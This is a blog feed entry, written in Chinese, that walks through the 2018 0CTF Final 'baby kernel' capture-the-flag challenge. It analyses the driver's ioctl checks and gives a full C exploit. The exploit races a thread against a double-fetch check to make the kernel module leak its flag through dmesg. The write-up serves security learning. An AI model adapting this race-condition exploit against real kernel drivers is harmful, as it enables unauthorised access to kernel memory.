  <entry>
    <title>2018 0CTF Final Baby Kernel</title>
    <link href="/2024/07/09/Double%20fetch/"/>
    <url>/2024/07/09/Double%20fetch/</url>
    
    <content type="html"><![CDATA[<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/35159529/1720485430430-6699875d-b5ee-4558-b77c-69c34dbbd1ed.png#averageHue=%23302f2e&clientId=u10d4496f-ce7d-4&from=paste&height=565&id=u3cc7f51a&originHeight=848&originWidth=1332&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=79012&status=done&style=none&taskId=u0434f380-5eb1-41db-af9f-d7e40d3ea59&title=&width=888" alt="image.png"><br>主要是ioctl的两个功能<br><code>cmd=0x6666</code>时，直接打印flag的地址<br>先分析<code>_chk_range_not_ok</code><img src="https://cdn.nlark.com/yuque/0/2024/png/35159529/1720486106138-ba516788-bc77-4b1c-9da9-53754362bb62.png#averageHue=%23302f2d&clientId=u10d4496f-ce7d-4&from=paste&height=183&id=u120af13a&originHeight=275&originWidth=1144&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=21504&status=done&style=none&taskId=uc9d2186a-ee60-46b1-a46a-0c8dedc6e20&title=&width=762.6666666666666" alt="image.png"><br><code>__CFADD__</code>是判断cf进位的<br>调试看下这个<code>boundary</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/35159529/1720487021651-43f6dc89-1ebe-48bb-82d4-e173958634f0.png#averageHue=%2330343c&clientId=u10d4496f-ce7d-4&from=paste&height=867&id=ube4fc1e8&originHeight=1300&originWidth=1260&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=207375&status=done&style=none&taskId=u41e97ae0-eb51-4fe5-8906-dd9c9f076b4&title=&width=840" alt="image.png"><br>根据内存布局<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35159529/1720487051569-dd9aa581-0188-4ff5-b912-609221617342.png#averageHue=%23d98636&clientId=u10d4496f-ce7d-4&from=paste&id=u79fb74f0&originHeight=475&originWidth=705&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=uf2f72eeb-d3a6-40fa-9bd4-9bae59e0857&title="><br>这个rdx的值其实就是用户态栈的栈顶<br>chk函数也就是在检查用户输入的这个地址，是否是一个用户态的地址<br>接着分析<code>cmd=0x1337</code>时，存在三个判断<br>第一个判断，判断这个地址是否在用户态<br>第二个判断，判断这个flag地址，是否在用户态<br>第三个判断，判断用户自定义的flag长度是否于题目中的想等</p><p>通过简单的逆向可得出一个简单的结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> *flag;<br>    <span class="hljs-type">int</span> len;<br>&#125;attk;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-system-x86_64 \<br>-m 256M -smp 2,cores=2,threads=1  \<br>-kernel ./vmlinuz-4.15.0-22-generic \<br>-initrd  ./core.cpio \<br>-append <span class="hljs-string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet&quot;</span> \<br>-cpu qemu64 \<br>-netdev user,<span class="hljs-built_in">id</span>=t0, -device e1000,netdev=t0,<span class="hljs-built_in">id</span>=nic0 \<br>-nographic  -enable-kvm  \<br></code></pre></td></tr></table></figure><p>执行出现了报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-system-x86_64 \<br>-m 256M -smp 2,cores=2,threads=1  \<br>-kernel ./vmlinuz-4.15.0-22-generic \<br>-initrd  ./core.cpio \<br>-append <span class="hljs-string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet&quot;</span> \<br>-cpu qemu64 \<br>-netdev user,<span class="hljs-built_in">id</span>=t0, -device e1000,netdev=t0,<span class="hljs-built_in">id</span>=nic0 \<br>-nographic  -enable-kvm  \<br></code></pre></td></tr></table></figure><p>发现是这个<code>-enable-kvm</code>选项导致了报错<br>通过<code>lsmod | grep kvm</code>查看是否存在<br>接着</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo modprobe kvm<br>sudo modprobe kvm_intel  <span class="hljs-comment"># 如果你使用的是 Intel CPU</span><br>sudo modprobe kvm_amd    <span class="hljs-comment"># 如果你使用的是 AMD CPU</span><br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">success</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)</span>&#123;<br>    <span class="hljs-type">char</span> *buf = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x100</span>,<span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;\033[32m\033[1m[+] %s\033[0m&quot;</span>, msg);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s\n&quot;</span>, buf);<br>    <span class="hljs-built_in">free</span>(buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">fail</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)</span> &#123;<br>    <span class="hljs-type">char</span> *buf = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x1000</span>, <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;\033[31m\033[1m[x] %s\033[0m&quot;</span>, msg);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s\n&quot;</span>, buf);<br>    <span class="hljs-built_in">free</span>(buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">debug</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)</span> &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> DEBUG</span><br>    <span class="hljs-type">char</span> *buf = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x1000</span>, <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;\033[34m\033[1m[*] %s\033[0m&quot;</span>, msg);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s\n&quot;</span>, buf);<br>    <span class="hljs-built_in">free</span>(buf);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">void</span> handle(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *), <span class="hljs-type">char</span> *hint, <span class="hljs-type">size_t</span> var)</span> &#123;<br>    <span class="hljs-type">char</span> *buf = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x1000</span>, <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;%s0x%lx&quot;</span>, hint, var);<br>    handle(buf);<br>    <span class="hljs-built_in">free</span>(buf);<br>&#125;<br><br><span class="hljs-type">void</span> * flag_addr;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">0x100</span>] = <span class="hljs-string">&quot;flyyy_kernel_exploit_demo&quot;</span>;<br><span class="hljs-type">int</span> status = <span class="hljs-number">1</span>,times = <span class="hljs-number">1000</span>;<br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> *flag;<br>    <span class="hljs-type">int</span> len;<br>&#125;attk;<br><br><span class="hljs-type">void</span>* <span class="hljs-title function_">update_flag_addr</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span>&#123;<br><br>    <span class="hljs-keyword">while</span> (status)<br>    &#123;<br>        attk.flag = flag_addr;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pwn</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> io_fd,addr_fd,result_fd;<br>    <span class="hljs-type">char</span> *tmp_addr;<br>    <span class="hljs-type">pthread_t</span> th;<br><br>    io_fd = open(<span class="hljs-string">&quot;/dev/baby&quot;</span>,O_RDWR);<br>    ioctl(io_fd,<span class="hljs-number">0x6666</span>);<br>    system(<span class="hljs-string">&quot;dmesg | grep flag &gt; flag_addr.txt&quot;</span>);<br><br>    addr_fd = open(<span class="hljs-string">&quot;/flag_addr.txt&quot;</span>,O_RDONLY);<br><br>    <span class="hljs-type">char</span> *tmp = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    tmp[read(addr_fd,tmp,<span class="hljs-number">0x100</span>)]=<span class="hljs-string">&#x27;\0&#x27;</span>;<br>    <span class="hljs-comment">// [   10.492915] Your flag is at ffffffffc01bb028! But I don&#x27;t think you know it&#x27;s content</span><br>    tmp_addr = <span class="hljs-built_in">strstr</span>(tmp,<span class="hljs-string">&quot;Your flag is at &quot;</span>) + <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;Your flag is at &quot;</span>);<br>    <span class="hljs-comment">// printf(&quot;%s\n&quot;,tmp_addr);</span><br><br>    flag_addr = strtoull(tmp_addr,tmp_addr+<span class="hljs-number">16</span>,<span class="hljs-number">16</span>);<br>    <span class="hljs-comment">// printf(&quot;flag addr 0x%llx\n&quot;,flag_addr);</span><br><br>    pthread_create(&amp;th,<span class="hljs-literal">NULL</span>,update_flag_addr,<span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">while</span> (status)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span> ; i &lt; times ; i++)&#123;<br>            attk.flag = buf;<br>            ioctl(io_fd,<span class="hljs-number">0x1337</span>,&amp;attk);<br>        &#125;<br>        system(<span class="hljs-string">&quot;dmesg | grep flag &gt; result.txt&quot;</span>);<br>        result_fd = open(<span class="hljs-string">&quot;/result.txt&quot;</span>,O_RDONLY);<br>        tmp[read(result_fd,tmp,<span class="hljs-number">0x100</span>)]=<span class="hljs-string">&#x27;\0&#x27;</span>;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(tmp,<span class="hljs-string">&quot;flag&#123;&quot;</span>))&#123;<br>            status = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    pthread_cancel(th);<br>    system(<span class="hljs-string">&quot;dmesg | grep flag&quot;</span>);<br>    success(<span class="hljs-string">&quot;find flag!!!&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    success(<span class="hljs-string">&quot;start to exploit!&quot;</span>);<br>    attk.flag = buf;<br>    attk.len = <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;flag&#123;THIS_WILL_BE_YOUR_FLAG_1234&#125;&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;length of flag: %d\n&quot;</span>,attk.len);<br>    <br>    pwn();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
